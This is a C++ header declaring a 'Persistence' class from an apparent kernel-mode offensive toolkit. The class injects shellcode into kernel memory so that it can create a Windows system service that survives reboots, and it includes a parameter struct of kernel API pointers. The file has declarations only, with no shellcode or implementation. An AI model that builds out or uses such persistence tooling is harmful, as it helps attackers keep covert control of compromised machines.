/**
 * @file Persistence.h
 * @author Gregory King
 * @date August 14, 2025
 * @brief This file contains the declaration of the Persistence class.
 *
 * The Persistence class provides functionality for establishing kernel-mode
 * persistence mechanisms using advanced shellcode injection techniques.
 */

#pragma once

#include "Providers/IProvider.h"
#include <string>
#include <memory>

namespace KernelMode {
    /**
     * @class Persistence
     * @brief Manages kernel-mode persistence operations.
     *
     * This class uses a provider to create persistent mechanisms that survive
     * system reboots by injecting shellcode into kernel memory to create
     * system services directly via kernel APIs.
     */
    class Persistence {
    public:
        /**
         * @brief Constructs a Persistence manager with a given provider.
         * @param provider A shared pointer to an active IProvider for kernel memory operations.
         */
        explicit Persistence(std::shared_ptr<Providers::IProvider> provider);

        /**
         * @brief Creates a new system service via kernel shellcode injection.
         * @param serviceName The name of the service to create.
         * @param executablePath The path to the executable for the service.
         * @return True if the service was created successfully, false otherwise.
         */
        bool CreateKernelService(const std::wstring& serviceName, const std::wstring& executablePath);

    private:
        /**
         * @struct KERNEL_PERSISTENCE_PARAMS
         * @brief Parameters passed to the kernel shellcode for service creation.
         */
        struct KERNEL_PERSISTENCE_PARAMS {
            uintptr_t ExAllocatePool;
            uintptr_t ExFreePool;
            uintptr_t RtlCreateRegistryKey;
            uintptr_t RtlWriteRegistryValue;
            wchar_t ServiceName[128];
            wchar_t ExecutablePath[256];
        };

        std::shared_ptr<Providers::IProvider> provider;
    };
}